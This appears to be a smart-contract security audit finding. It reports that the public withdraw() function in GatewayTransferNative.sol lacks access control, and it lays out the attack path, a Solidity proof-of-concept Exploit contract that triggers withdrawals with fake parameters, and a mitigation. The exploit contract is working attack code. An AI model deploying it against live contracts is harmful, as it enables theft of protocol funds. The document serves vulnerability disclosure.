# Anyone Can Trigger Withdrawals from the Gateway on Behalf of Any User

## Summary

A missing access restriction in `GatewayTransferNative.sol:286` will cause an unauthorized withdrawal for the protocol as any attacker can call the `withdraw()` function directly with arbitrary parameters, bypassing all necessary checks and mechanisms enforced by the actual protocol flow.

## Root Cause

In `GatewayTransferNative.sol`, the `withdraw()` function is marked `public`, which allows any external user to invoke it freely. This function wraps a sensitive `gateway.withdraw()` call that triggers cross-chain token transfers.

## Internal Pre-conditions

- Attacker needs to observe or know a valid `externalId` value.
- Attacker chooses any arbitrary `sender` and `amount` combination.

## External Pre-conditions

- `gateway.withdraw()` must not have additional access control.
- Gas price must be sufficient to execute the withdrawal.

## Attack Path

1. Attacker directly calls the public `withdraw()` function with crafted parameters:

```solidity
withdraw(
    externalId,         // some random bytes32
    sender,             // encoded malicious address
    outputToken,        // any token that the gateway allows
    amount              // any value
)
```

2. `withdraw()` internally calls the `gateway.withdraw()` function.
3. Funds are transferred to the attacker’s control, bypassing legitimate cross-chain flow or validation logic.

## Impact

- The protocol suffers an arbitrary token withdrawal, potentially draining liquidity.
- The attacker gains full control over the withdrawn funds.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IGatewayTransferNative {
    function withdraw(
        bytes32 externalId,
        bytes calldata sender,
        address outputToken,
        uint256 amount
    ) external;
}

contract Exploit {
    IGatewayTransferNative public gatewayTransfer;

    constructor(address _target) {
        gatewayTransfer = IGatewayTransferNative(_target);
    }

    function executeAttack(address outputToken, uint256 amount) external {
        bytes32 fakeExternalId = keccak256("fake_id");
        bytes memory fakeSender = abi.encodePacked(msg.sender); // attacker's address
        gatewayTransfer.withdraw(fakeExternalId, fakeSender, outputToken, amount);
    }
}
```

## Mitigation

- Mark the `withdraw()` function as `internal` and ensure it can only be accessed through controlled and verified internal contract logic, such as via a trusted router or `onlyGateway` modifier if needed.
